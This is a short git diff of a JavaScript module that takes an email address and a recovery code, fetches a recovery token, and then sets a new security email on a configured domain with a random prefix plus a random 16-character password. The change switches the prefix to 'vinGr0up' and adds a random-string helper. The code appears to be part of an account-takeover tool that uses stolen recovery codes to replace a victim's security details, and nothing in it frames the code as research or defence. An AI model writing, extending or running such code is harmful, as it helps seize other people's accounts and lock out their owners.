@@ -77,8 +77,9 @@ module.exports = async (email, recoveryCode) => {
     })
     if (recToken?.data?.token) {
 
-      const prefix = config.prefix || "HachiiroMC";
-      let secEmail = `${prefix}${generate(10)}@${domains[0]}`;
+      const config = require("../../../config.json");
+      const prefix = config.prefix || "vinGr0up";
+      let secEmail = `${prefix}${generate(10)}@${config.domains[0]}`;
       let password = generate(16)
       await axios({
         method: "POST",
@@ -103,3 +104,15 @@ module.exports = async (email, recoveryCode) => {
     return null
   }
 };
+
+function generate(length) {
+    let result = '';
+    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    const charactersLength = characters.length;
+    let counter = 0;
+    while (counter < length) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+      counter += 1;
+    }
+    return result;
+}
